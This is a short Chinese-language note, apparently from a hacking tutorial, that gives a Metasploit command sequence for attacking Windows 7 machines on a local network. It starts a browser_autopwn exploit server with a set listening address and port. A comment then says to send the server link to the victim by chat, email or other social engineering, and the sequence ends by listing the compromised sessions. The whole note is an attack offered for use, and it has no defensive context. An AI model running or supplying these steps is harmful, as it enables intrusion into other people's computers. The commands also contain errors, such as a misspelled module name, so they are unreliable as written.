## 使用Metaspolit在局域网中破解Windows 7

```bash
msfconsole
use auxiliary/server/brower_autopwn
options
set lhost 192.168.1.4
set port 4444
set uripath /
exploit
# 通过聊天或电子邮件或任何社会工程技术将服务器的链接发送给受害者。
sessions
```

[原文](https://www.hackingarticles.in/how-to-hack-windows-7-in-lan-using-metaspolit/)

